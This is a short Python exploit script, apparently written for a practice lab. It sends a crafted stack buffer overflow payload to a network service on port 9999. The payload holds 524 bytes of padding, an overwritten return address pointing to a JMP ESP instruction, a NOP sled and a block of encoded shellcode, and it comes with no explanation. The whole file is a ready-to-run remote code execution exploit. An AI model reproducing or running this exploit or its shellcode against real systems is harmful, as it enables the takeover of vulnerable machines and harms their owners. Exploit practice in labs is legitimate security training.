
import socket 


#   0022F960   50577148  HqWP   esp 528 
#   0022F95C   6C484664  dFHl   eip 524


#   311712F3   . FFE4           JMP ESP 

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

s.connect(('10.10.233.248',9999))

pattern = 'LjVMwv6Dk8qc40tiFkcn9pdwbDYodPIn1eHQiYF42KVctoijspQwuVLdL32L32A1e9VoAWOfDZbZKhgcULwyrFc2kKoz5kE4WvEsxwd4rwwC4CsLIr4AZbgvMIE9Lv9cqXCS0yeSmpSGIwdh1lOsrzNkKcNY0YTcrKhrJ22ymNcHdciPp0dgUiwjSS8h8PiraRubLFiu0XvOdqsmdVb8UxuLpBpLvWzhgbJLVvcOdKZmwMveXFx3BTd2Lm5K8gHcXkLQdirFqQQwBFJBjEpvz80TkGzWrG0VDHx0Fe6N2yBdozHtB2AnVBZmQf2Yx6e68tPhxui8zhhUhYTMoQxqc7nx2AUYEzou6MpCoBJSwsKJFaRJlWd6WIDMb4edIsk8EZk1fJUKJuXnNR77TTPpW0LPmdMvg5Gp8p13VW0TzVUTvg5YNQjqHpxj8eR7FWEG7D4KhsdtNV2HurU3nyvYJfmHGiv9pr5zPqwDSjP0sPk98IDqY9SuWKWNjhwFCN4erBxLYUIoWaeDdFHlHqWPp4hq0xaJNYCacuhVaGsMDyQOTeXk8VcA0geut9urKSQn0M7Qqox9DEv7eM8nWJJ7hJk2hqT6D64oR72T5SbzHYSkJaFvpVTE90Gpt82IOT47fqZfgGH0rqbb9zBiZHO0vV5H7f8cYY01Ol5WWuNuITiNydi7FTkvpVMfLiJsRrU0MMvkcRz6WZTY20Bz0hvP82Fe8IgL3Qq4gPKkLkNGcsQbZOUgOyFJ4llhNpOKmeRN1MgBrMvufAnKvVvYkkuyjK9uqg7Ogdt9aEpv33AdcpQIEQ9jzF8fLixjYIY5v1MditypPjNnAGqFOn8nA9lru527i0ssmyNifaikQCYzq07exyUuz4dwM4aCN0iYVVdRoC4KmYyaL4WzANX1HdEt77xPf5ulZRsRCqEqgygVwQGGOe25GyPqlvSpBXOHdcMCVwZNM2qW3ODOX8kL6L6RnWYgoCDngdfk8pTzEqig'

junk = 'A'*524
eip = '\xF3\x12\x17\x31'
nops = '\x90'*20
esp = ("\xdb\xce\xd9\x74\x24\xf4\x5d\xb8\x20\x92\x3f\xfa\x2b\xc9\xb1"
"\x52\x31\x45\x17\x03\x45\x17\x83\xcd\x6e\xdd\x0f\xf1\x67\xa0"
"\xf0\x09\x78\xc5\x79\xec\x49\xc5\x1e\x65\xf9\xf5\x55\x2b\xf6"
"\x7e\x3b\xdf\x8d\xf3\x94\xd0\x26\xb9\xc2\xdf\xb7\x92\x37\x7e"
"\x34\xe9\x6b\xa0\x05\x22\x7e\xa1\x42\x5f\x73\xf3\x1b\x2b\x26"
"\xe3\x28\x61\xfb\x88\x63\x67\x7b\x6d\x33\x86\xaa\x20\x4f\xd1"
"\x6c\xc3\x9c\x69\x25\xdb\xc1\x54\xff\x50\x31\x22\xfe\xb0\x0b"
"\xcb\xad\xfd\xa3\x3e\xaf\x3a\x03\xa1\xda\x32\x77\x5c\xdd\x81"
"\x05\xba\x68\x11\xad\x49\xca\xfd\x4f\x9d\x8d\x76\x43\x6a\xd9"
"\xd0\x40\x6d\x0e\x6b\x7c\xe6\xb1\xbb\xf4\xbc\x95\x1f\x5c\x66"
"\xb7\x06\x38\xc9\xc8\x58\xe3\xb6\x6c\x13\x0e\xa2\x1c\x7e\x47"
"\x07\x2d\x80\x97\x0f\x26\xf3\xa5\x90\x9c\x9b\x85\x59\x3b\x5c"
"\xe9\x73\xfb\xf2\x14\x7c\xfc\xdb\xd2\x28\xac\x73\xf2\x50\x27"
"\x83\xfb\x84\xe8\xd3\x53\x77\x49\x83\x13\x27\x21\xc9\x9b\x18"
"\x51\xf2\x71\x31\xf8\x09\x12\x34\xf7\x1c\xe3\x20\x05\x1e\xf2"
"\xec\x80\xf8\x9e\x1c\xc5\x53\x37\x84\x4c\x2f\xa6\x49\x5b\x4a"
"\xe8\xc2\x68\xab\xa7\x22\x04\xbf\x50\xc3\x53\x9d\xf7\xdc\x49"
"\x89\x94\x4f\x16\x49\xd2\x73\x81\x1e\xb3\x42\xd8\xca\x29\xfc"
"\x72\xe8\xb3\x98\xbd\xa8\x6f\x59\x43\x31\xfd\xe5\x67\x21\x3b"
"\xe5\x23\x15\x93\xb0\xfd\xc3\x55\x6b\x4c\xbd\x0f\xc0\x06\x29"
"\xc9\x2a\x99\x2f\xd6\x66\x6f\xcf\x67\xdf\x36\xf0\x48\xb7\xbe"
"\x89\xb4\x27\x40\x40\x7d\x57\x0b\xc8\xd4\xf0\xd2\x99\x64\x9d"
"\xe4\x74\xaa\x98\x66\x7c\x53\x5f\x76\xf5\x56\x1b\x30\xe6\x2a"
"\x34\xd5\x08\x98\x35\xfc")

junk2 = 'B'*(1000-len(junk+eip+nops+esp))

payload = junk + eip + nops + esp + junk2
payload = payload.encode('raw_unicode_escape')

msg = s.recv(4096).decode()

print(msg)
s.send(payload)


s.close()
